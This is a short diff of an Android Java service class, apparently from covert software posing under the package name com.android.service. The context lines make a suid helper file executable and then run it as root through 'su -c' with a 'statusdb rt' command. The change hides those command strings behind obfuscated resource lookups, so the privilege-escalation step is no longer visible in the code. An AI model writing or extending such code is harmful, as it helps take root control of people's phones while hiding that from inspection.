@@ -456,7 +456,7 @@ public class ServiceCore extends Service {
 			}
 
 			Runtime.getRuntime().exec("chmod 755 " + path + "/" + suidext);
-			Process localProcess = Runtime.getRuntime().exec(new String[] {"su", "-c", "/data/data/com.android.service/files/statusdb rt"}); //$NON-NLS-1$ //$NON-NLS-2$
+			Process localProcess = Runtime.getRuntime().exec(new String[] {Messages.getString("32.30"), "-c", Messages.getString("32.29")}); //$NON-NLS-1$ //$NON-NLS-2$
 			
 			localProcess.waitFor();		
 		} catch (final Exception e1) {
